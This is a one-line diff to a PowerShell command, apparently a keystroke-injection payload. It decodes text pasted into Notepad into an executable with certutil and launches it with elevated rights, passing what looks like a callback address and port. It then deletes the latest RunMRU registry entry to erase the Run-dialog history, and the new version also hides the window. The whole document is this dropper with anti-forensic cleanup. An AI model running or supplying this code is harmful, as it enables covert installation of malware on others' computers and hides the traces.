@@ -1,1 +1,1 @@
-powershell wait-process(saps notepad($a=[io.path]::gettempfilename())-pa).id;certutil -decode $a $a'.exe';rm $a;saps -verb runas $a'.exe' '255.255.255.255 1337';$a='HKCU:\software\microsoft\windows\currentversion\explorer\runmru';rp -pa $a(gp $a).mrulist[0]
+powershell -w 1 wait-process(saps notepad($a=[io.path]::gettempfilename())-pa).id;certutil -decode $a ($a+='.exe');rm $a;saps -verb runas $a FFFFFFFF697A;$a='HKCU:\software\microsoft\windows\currentversion\explorer\runmru';rp -pa $a(gp $a).mrulist[0]
